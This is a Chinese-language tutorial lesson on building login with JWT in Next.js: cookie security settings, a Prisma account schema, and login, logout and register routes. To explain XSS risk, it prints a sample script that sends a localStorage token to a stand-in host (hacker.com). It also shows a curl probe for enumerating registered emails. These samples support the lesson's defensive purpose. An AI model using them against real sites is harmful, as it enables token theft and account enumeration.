# 02 - 登录认证与 JWT

## 📖 本课目标

实现完整的用户登录系统，理解 JWT 认证机制，掌握安全的 token 存储方式。

本课结束后你将掌握：
- ✅ JWT vs Session 的本质区别和选型依据
- ✅ JWT 三段结构（header.payload.signature）完整解析
- ✅ httpOnly Cookie 防 XSS 攻击原理
- ✅ Account 表设计（支持多种登录方式）
- ✅ 登录 API（密码验证 + JWT 生成）
- ✅ 登出 API（Cookie 清除）
- ✅ 防枚举攻击、账号禁用等安全策略

---

## 🤔 为什么这样选（技术选型理由）

### JWT vs Session：核心区别

| 维度 | Session（传统方案） | JWT（现代方案） |
|------|-------------------|----------------|
| **存储位置** | 服务端（内存/Redis） | 客户端（Cookie/localStorage） |
| **服务器压力** | 需要维护会话状态 | 无状态（Stateless） |
| **扩展性** | 难（多台服务器需要共享 Session） | 易（任何服务器都能验证） |
| **吊销机制** | 简单（删除 Session） | 复杂（需要黑名单） |
| **跨域支持** | 困难（Cookie 同源限制） | 简单（Header 传递） |
| **适用场景** | 传统单体应用 | 微服务/API 服务 |

**示例对比：**

```
Session 流程：
用户登录 → 服务器生成 Session ID（abc123）→ 存到 Redis
      → 返回 Cookie: session_id=abc123
用户请求 → 带上 Cookie → 服务器从 Redis 查 Session → 验证身份

JWT 流程：
用户登录 → 服务器生成 JWT（包含用户信息） → 返回 Cookie: token=eyJhbGci...
用户请求 → 带上 Cookie → 服务器解密 JWT（无需查库）→ 验证身份
```

**为什么选 JWT？**

1. **无状态** - 不需要 Redis，服务器重启不影响用户登录状态
2. **水平扩展** - 负载均衡到任何服务器都能验证
3. **现代架构** - Next.js/Vercel 无服务器环境的首选
4. **跨服务** - 一个 token 可用于多个微服务

**JWT 的代价：**
- 无法主动吊销（解决方案：黑名单 + 短过期时间）
- Token 体积大（解决方案：压缩 payload）
- 时间同步要求高（解决方案：NTP）

### httpOnly Cookie vs localStorage：安全性对比

**XSS 攻击场景：**

假设网站有 XSS 漏洞（用户输入未过滤）：

```html
<!-- 攻击者评论中插入脚本 -->
<script>
  // ❌ localStorage 直接被盗
  const token = localStorage.getItem('token')
  fetch('https://hacker.com/steal?token=' + token)
</script>
```

```typescript
// ❌ localStorage 存储（不安全）
localStorage.setItem('token', jwt)
// JavaScript 可以随时读取：
console.log(localStorage.getItem('token'))  // 攻击者也能读取
```

```typescript
// ✅ httpOnly Cookie 存储（安全）
response.cookies.set('token', jwt, { httpOnly: true })
// JavaScript 无法读取：
console.log(document.cookie)  // "token=" 看不到值！
```

**httpOnly 原理：**

浏览器收到 `Set-Cookie: token=xxx; HttpOnly` 后：
- ✅ 自动在每次请求带上这个 Cookie
- ❌ JavaScript 无法通过 `document.cookie` 读取
- ❌ 攻击者的脚本无法窃取 token

**完整安全配置：**

```typescript
response.cookies.set('token', jwt, {
  httpOnly: true,   // 防 XSS（JS 无法读取）
  secure: true,     // 防中间人攻击（仅 HTTPS 传输）
  sameSite: 'lax',  // 防 CSRF（第三方网站无法发起请求）
  maxAge: 7 * 24 * 60 * 60,  // 7 天过期
})
```

| 属性 | 作用 | 攻击类型 |
|------|------|---------|
| `httpOnly` | JS 无法读取 | XSS（跨站脚本） |
| `secure` | 仅 HTTPS 传输 | 中间人攻击 |
| `sameSite` | 限制跨站请求 | CSRF（跨站请求伪造） |

---

## 🧠 JWT 结构解析（大白话版）

### JWT 长什么样？

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJjbW12aGp6ZGwiLCJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJpYXQiOjE3MTA3NDI4MDAsImV4cCI6MTcxMTM0NzYwMH0.KqZ_9z1gK8zXqrLy2e1VW_5f4dcc3b5aa765d61d8327deb882cf99
```

**三段结构：**
```
Header.Payload.Signature
  ↓      ↓        ↓
头部   载荷      签名
```

### 第一段：Header（头部）

```json
// 原始数据
{
  "alg": "HS256",  // 加密算法：HMAC-SHA256
  "typ": "JWT"     // 类型：JWT
}

// Base64 编码后
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
```

**作用：** 告诉服务器用什么算法验证签名。

### 第二段：Payload（载荷/声明）

```json
// 原始数据
{
  "userId": "cmmvhjzdl",       // 自定义字段：用户 ID
  "email": "test@test.com",    // 自定义字段：邮箱
  "iat": 1710742800,           // 签发时间（Issued At）
  "exp": 1711347600            // 过期时间（Expiration Time）
}

// Base64 编码后
eyJ1c2VySWQiOiJjbW12aGp6ZGwiLCJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJpYXQiOjE3MTA3NDI4MDAsImV4cCI6MTcxMTM0NzYwMH0
```

**重要：** Payload 只是 Base64 编码，**不是加密**！任何人都能解码看到内容。

```bash
# 解码示例
echo "eyJ1c2VySWQiOiJjbW12aGp6ZGwiLCJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJpYXQiOjE3MTA3NDI4MDAsImV4cCI6MTcxMTM0NzYwMH0" | base64 -d
# 输出：{"userId":"cmmvhjzdl","email":"test@test.com","iat":1710742800,"exp":1711347600}
```

**安全建议：** 不要把密码、银行卡号等敏感信息放到 Payload！

### 第三段：Signature（签名）

```javascript
// 计算签名
const signature = HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret  // 服务器密钥（JWT_SECRET）
)

// 结果
KqZ_9z1gK8zXqrLy2e1VW_5f4dcc3b5aa765d61d8327deb882cf99
```

**作用：** 防止 Token 被篡改。

**验证流程：**

```typescript
// 攻击者尝试篡改 Payload
const fakePayload = { userId: "admin", email: "hacker@evil.com" }
const fakeToken = header + "." + base64(fakePayload) + "." + signature

// 服务器验证时重新计算签名
const expectedSignature = HMACSHA256(header + "." + base64(fakePayload), secret)

if (expectedSignature !== signature) {
  throw new Error('Token 已被篡改')  // ← 攻击失败
}
```

只要攻击者不知道 `JWT_SECRET`，就无法伪造有效的签名。

---

## 💻 数据库变更：Account 表设计

### 为什么需要 Account 表？

**问题场景：**

用户可以通过多种方式登录：
- 📧 邮箱密码
- 🐙 GitHub OAuth
- 💼 钉钉扫码
- 💬 微信登录

如果只有 User 表：
```typescript
model User {
  email     String?  // GitHub 用户可能没邮箱
  password  String?  // OAuth 用户没密码
  githubId  String?  // 字段爆炸
  dingtalkId String?
  wechatId  String?
}
```

**问题：**
1. 字段无限膨胀
2. 一个用户只能用一种方式登录
3. 逻辑复杂（判断哪个字段有值）

**解决方案：Account 表（一对多关系）**

```
User (用户主体)
  └── Account (登录方式，可以有多个)
       ├── provider: "credentials" (邮箱密码)
       ├── provider: "github"      (GitHub OAuth)
       └── provider: "dingtalk"    (钉钉扫码)
```

### 更新后的 Schema

**`prisma/schema.prisma`**

```prisma
generator client {
  provider = "prisma-client-js"
}

datasource db {
  provider = "postgresql"
}

// 用户表（核心主体）
model User {
  id        String    @id @default(cuid())
  email     String?   @unique   // 改为可选（第三方登录可能没邮箱）
  password  String?             // 改为可选（OAuth 用户没密码）
  name      String?
  avatar    String?
  status    Boolean   @default(true)  // 账号状态（禁用/启用）
  accounts  Account[]               // 一对多：一个用户多种登录方式
  todos     Todo[]
  createdAt DateTime  @default(now())
  updatedAt DateTime  @updatedAt
}

// 账号表（登录方式）
model Account {
  id                String   @id @default(cuid())
  userId            String                           // 外键：所属用户
  provider          String                           // 登录方式："credentials" | "github" | "dingtalk"
  providerAccountId String                           // 该平台的用户唯一标识
  accessToken       String?                          // OAuth access_token（可选）
  refreshToken      String?                          // OAuth refresh_token（可选）
  expiresAt         Int?                             // Token 过期时间（Unix 时间戳）
  user              User     @relation(fields: [userId], references: [id], onDelete: Cascade)
  createdAt         DateTime @default(now())
  updatedAt         DateTime @updatedAt

  // 联合唯一索引：同一平台同一账号只能绑定一次
  @@unique([provider, providerAccountId])
}

model Todo {
  id        String   @id @default(cuid())
  title     String
  done      Boolean  @default(false)
  userId    String
  user      User     @relation(fields: [userId], references: [id], onDelete: Cascade)
  createdAt DateTime @default(now())
  updatedAt DateTime @updatedAt
}
```

**关键设计点：**

1. **`@@unique([provider, providerAccountId])`**
   - 防止重复绑定：同一个 GitHub 账号不能绑定两个用户
   
2. **`onDelete: Cascade`**
   - 删除用户时自动删除关联的 Account 和 Todo
   
3. **`email` 和 `password` 改为可选**
   - GitHub 用户可能不公开邮箱
   - OAuth 用户没有密码

**执行迁移：**

```bash
pnpm prisma migrate dev --name add-account-table
pnpm prisma generate
```

---

## 💻 完整可运行代码

### 1. 更新注册 API（兼容 Account 表）

**`src/app/api/auth/register/route.ts`**

```typescript
import { NextRequest, NextResponse } from 'next/server'
import bcrypt from 'bcryptjs'
import { prisma } from '@/lib/prisma'

/**
 * 用户注册 API
 * POST /api/auth/register
 */
export async function POST(req: NextRequest) {
  try {
    const { email, password, name } = await req.json()

    // 参数校验
    if (!email || !password) {
      return NextResponse.json(
        { error: '邮箱和密码必填' }, 
        { status: 400 }
      )
    }

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
    if (!emailRegex.test(email)) {
      return NextResponse.json(
        { error: '邮箱格式不正确' }, 
        { status: 400 }
      )
    }

    if (password.length < 6) {
      return NextResponse.json(
        { error: '密码至少 6 位' }, 
        { status: 400 }
      )
    }

    // 检查邮箱是否已注册
    const existing = await prisma.user.findUnique({ 
      where: { email } 
    })

    if (existing) {
      return NextResponse.json(
        { error: '该邮箱已注册' }, 
        { status: 409 }
      )
    }

    // 密码加密
    const hashedPassword = await bcrypt.hash(password, 10)

    // 创建用户 + credentials 类型的 Account
    const user = await prisma.user.create({
      data: {
        email,
        password: hashedPassword,
        name,
        accounts: {
          create: {
            provider: 'credentials',        // 标记为邮箱密码登录
            providerAccountId: email,       // 用邮箱作为标识
          }
        }
      },
      select: { 
        id: true, 
        email: true, 
        name: true, 
        avatar: true,
        createdAt: true 
      }
    })

    return NextResponse.json({ user }, { status: 201 })

  } catch (error) {
    console.error('注册错误:', error)
    return NextResponse.json(
      { error: '服务器错误，请稍后重试' }, 
      { status: 500 }
    )
  }
}
```

### 2. 登录 API（核心实现）

**`src/app/api/auth/login/route.ts`**

```typescript
import { NextRequest, NextResponse } from 'next/server'
import bcrypt from 'bcryptjs'
import jwt from 'jsonwebtoken'
import { prisma } from '@/lib/prisma'

/**
 * 用户登录 API
 * POST /api/auth/login
 * 
 * 请求体：
 * {
 *   "email": "user@example.com",
 *   "password": "123456"
 * }
 * 
 * 响应：
 * - 成功：设置 httpOnly Cookie，返回用户信息
 * - 失败：返回错误信息
 */
export async function POST(req: NextRequest) {
  try {
    // 1. 解析请求体
    const { email, password } = await req.json()

    // 2. 参数校验
    if (!email || !password) {
      return NextResponse.json(
        { error: '邮箱和密码必填' }, 
        { status: 400 }
      )
    }

    // 3. 查找用户（同时查询 credentials 类型的 Account）
    const user = await prisma.user.findUnique({
      where: { email },
      include: {
        accounts: { 
          where: { provider: 'credentials' }  // 只查邮箱密码登录方式
        }
      }
    })

    // 4. 防枚举攻击：不区分"用户不存在"和"密码错误"
    // 攻击者无法通过错误信息判断邮箱是否已注册
    if (!user || !user.password || user.accounts.length === 0) {
      return NextResponse.json(
        { error: '邮箱或密码错误' }, 
        { status: 401 }  // 401 Unauthorized
      )
    }

    // 5. 检查账号是否被禁用
    if (!user.status) {
      return NextResponse.json(
        { error: '账号已被禁用，请联系管理员' }, 
        { status: 403 }  // 403 Forbidden
      )
    }

    // 6. 验证密码
    const isValid = await bcrypt.compare(password, user.password)
    if (!isValid) {
      return NextResponse.json(
        { error: '邮箱或密码错误' }, 
        { status: 401 }
      )
    }

    // 7. 生成 JWT
    const token = jwt.sign(
      // Payload（载荷）：存储非敏感的用户信息
      { 
        userId: user.id, 
        email: user.email 
      },
      // Secret（密钥）：从环境变量读取
      process.env.JWT_SECRET!,
      // Options（配置）
      { 
        expiresIn: '7d',  // 7 天后过期
        algorithm: 'HS256'  // 加密算法
      }
    )

    // 8. 创建响应
    const response = NextResponse.json({
      user: { 
        id: user.id, 
        email: user.email, 
        name: user.name, 
        avatar: user.avatar 
      }
    })

    // 9. 设置 httpOnly Cookie（安全存储 token）
    response.cookies.set('token', token, {
      httpOnly: true,   // JavaScript 无法读取（防 XSS）
      secure: process.env.NODE_ENV === 'production',  // 生产环境仅 HTTPS
      sameSite: 'lax',  // 防 CSRF 攻击
      maxAge: 60 * 60 * 24 * 7,  // 7 天（秒）
      path: '/',        // Cookie 作用路径
    })

    return response

  } catch (error) {
    console.error('登录错误:', error)
    return NextResponse.json(
      { error: '服务器错误，请稍后重试' }, 
      { status: 500 }
    )
  }
}
```

### 3. 登出 API

**`src/app/api/auth/logout/route.ts`**

```typescript
import { NextRequest, NextResponse } from 'next/server'

/**
 * 用户登出 API
 * POST /api/auth/logout
 * 
 * 作用：清除 httpOnly Cookie
 */
export async function POST(req: NextRequest) {
  // 创建响应
  const response = NextResponse.json({ 
    message: '登出成功' 
  })

  // 清除 Cookie（设置过期时间为过去）
  response.cookies.set('token', '', {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax',
    maxAge: 0,  // 立即过期
    path: '/',
  })

  return response
}
```

### 4. 工具函数：从 Cookie 获取当前用户

**`src/lib/auth.ts`**

```typescript
import { NextRequest } from 'next/server'
import jwt from 'jsonwebtoken'
import { prisma } from './prisma'

/**
 * 从请求中获取当前登录用户
 * 
 * @param req - Next.js 请求对象
 * @returns 用户对象或 null
 */
export async function getCurrentUser(req: NextRequest) {
  try {
    // 1. 从 Cookie 读取 token
    const token = req.cookies.get('token')?.value

    if (!token) {
      return null
    }

    // 2. 验证 JWT 签名 + 解码 Payload
    const decoded = jwt.verify(
      token, 
      process.env.JWT_SECRET!
    ) as { userId: string; email: string }

    // 3. 从数据库查询用户（确保用户仍然存在且未被禁用）
    const user = await prisma.user.findUnique({
      where: { id: decoded.userId },
      select: { 
        id: true, 
        email: true, 
        name: true, 
        avatar: true, 
        status: true 
      }
    })

    // 4. 检查账号状态
    if (!user || !user.status) {
      return null
    }

    return user

  } catch (error) {
    // JWT 过期、签名无效等错误
    console.error('Token 验证失败:', error)
    return null
  }
}
```

**使用示例：**

```typescript
// 在需要登录的 API 中使用
import { getCurrentUser } from '@/lib/auth'

export async function GET(req: NextRequest) {
  const user = await getCurrentUser(req)

  if (!user) {
    return NextResponse.json(
      { error: '请先登录' }, 
      { status: 401 }
    )
  }

  // 用户已登录，继续处理...
  return NextResponse.json({ user })
}
```

---

## ⚠️ 避坑指南（真实踩过的坑）

### 坑 1：密码字段没有过滤就返回

**错误代码：**
```typescript
const user = await prisma.user.findUnique({
  where: { email },
  include: { accounts: true }
})

return NextResponse.json({ user })  // ❌ 密码泄漏！
```

**正确做法：**
```typescript
// ✅ 用 select 排除 password
const user = await prisma.user.findUnique({
  where: { email },
  select: { id: true, email: true, name: true, avatar: true }
})
```

### 坑 2：JWT_SECRET 写死在代码里

**错误代码：**
```typescript
const token = jwt.sign(payload, 'my-secret-key')  // ❌ 硬编码
```

**后果：** 代码提交到 GitHub → 任何人都能伪造 JWT

**正确做法：**
```typescript
// ✅ 从环境变量读取
const token = jwt.sign(payload, process.env.JWT_SECRET!)

// .env 文件（不要提交到 Git）
JWT_SECRET="随机生成的 64 位字符串"
```

**生成安全密钥：**
```bash
# macOS/Linux
openssl rand -base64 64

# Node.js
node -e "console.log(require('crypto').randomBytes(64).toString('base64'))"
```

### 坑 3：错误信息暴露用户是否存在

**错误代码：**
```typescript
const user = await prisma.user.findUnique({ where: { email } })

if (!user) {
  return NextResponse.json({ error: '用户不存在' })  // ❌ 枚举攻击
}

const isValid = await bcrypt.compare(password, user.password)
if (!isValid) {
  return NextResponse.json({ error: '密码错误' })  // ❌ 暴露信息
}
```

**攻击场景：**
```bash
# 攻击者测试邮箱是否已注册
curl -X POST /api/auth/login -d '{"email":"admin@example.com","password":"123"}'
# 返回："用户不存在" → 邮箱未注册
# 返回："密码错误" → 邮箱已注册，继续爆破密码
```

**正确做法：**
```typescript
// ✅ 统一返回模糊错误
if (!user || !isValid) {
  return NextResponse.json({ error: '邮箱或密码错误' })
}
```

### 坑 4：忘记验证 JWT 过期时间

**错误代码：**
```typescript
// ❌ 只解码，不验证
const decoded = jwt.decode(token) as { userId: string }
```

**后果：** 过期的 token 依然有效

**正确做法：**
```typescript
// ✅ jwt.verify 会自动检查过期时间
const decoded = jwt.verify(token, process.env.JWT_SECRET!)
// 过期会抛出 TokenExpiredError
```

### 坑 5：Cookie sameSite 设置错误导致跨域失败

**错误代码：**
```typescript
response.cookies.set('token', jwt, {
  sameSite: 'strict'  // ❌ 太严格，跨子域名都不行
})
```

**问题：**
- `sameSite: 'strict'` - 只允许同站请求，`www.example.com` → `api.example.com` 会被拦截
- `sameSite: 'none'` - 需要配合 `secure: true`，只能用于 HTTPS

**正确做法：**
```typescript
sameSite: 'lax'  // ✅ 平衡安全性和可用性
```

| sameSite | 允许场景 | 适用 |
|----------|---------|------|
| `strict` | 完全同站 | 银行等高安全场景 |
| `lax` | 允许顶级导航（点击链接） | 大部分应用 ✅ |
| `none` | 允许跨站（需 HTTPS） | 第三方嵌入 |

---

## ✅ 本课收获

- ✅ **认证机制对比**：JWT vs Session 深度理解、选型依据
- ✅ **JWT 原理**：三段结构（header.payload.signature）、签名验证流程
- ✅ **安全存储**：httpOnly Cookie vs localStorage、防 XSS/CSRF 原理
- ✅ **数据库设计**：Account 表支持多种登录方式、联合唯一索引
- ✅ **API 实现**：登录（密码验证 + JWT 生成）、登出（Cookie 清除）
- ✅ **安全策略**：防枚举攻击、账号禁用、密码字段过滤
- ✅ **工具函数**：从 Cookie 解析当前用户、Token 验证

**核心代码文件：**
```
src/
├── app/api/auth/
│   ├── register/route.ts  ← 注册（创建 User + Account）
│   ├── login/route.ts     ← 登录（验证密码 + 生成 JWT）
│   └── logout/route.ts    ← 登出（清除 Cookie）
├── lib/
│   ├── prisma.ts          ← Prisma Client 单例
│   └── auth.ts            ← getCurrentUser 工具函数
prisma/
└── schema.prisma          ← User + Account + Todo 表结构
```

---

## 🎯 下一步

**03 - GitHub 第三方登录（OAuth 2.0）**

内容预告：
- OAuth 2.0 授权流程图解（4 步完整流程）
- 为什么不用 NextAuth（自己实现更能学到原理）
- GitHub OAuth App 创建步骤
- callback 处理逻辑（Account 表查重、新用户创建）
- state 参数防 CSRF 攻击

**练习建议：**

1. **实战练习** - 实现 `/api/auth/me` 返回当前用户信息
2. **安全加固** - 添加登录失败次数限制（5 次后锁定 15 分钟）